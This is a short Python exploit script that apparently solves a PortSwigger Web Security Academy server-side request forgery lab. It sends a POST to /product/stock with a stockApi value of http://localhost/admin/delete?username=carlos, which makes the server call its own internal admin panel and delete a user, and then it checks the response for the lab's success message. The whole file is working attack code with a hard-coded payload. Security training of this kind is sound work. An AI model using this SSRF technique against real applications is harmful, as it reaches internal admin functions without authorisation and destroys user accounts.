import requests
import sys



def delete_carlos_user(url):
    try:
        print("(+) Deleting Carlos user...")
        response = requests.post(f"{url}/product/stock", data={'stockApi': 'http://localhost/admin/delete?username=carlos'}, timeout=10)
        if "Congratulations, you solved the lab!" in response.text:
            print("(+) Carlos user successfully deleted")
        else:
            print("(-) Carlos user has not been successfully deleted")

    except requests.exceptions.Timeout:
        print("(-) Request timed out. Please check your url and try again.")

    except requests.exceptions.RequestException as e:
        print(f"(-) An error has occurred: {e}")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip("/")
    delete_carlos_user(url)


if __name__ == "__main__":
    main()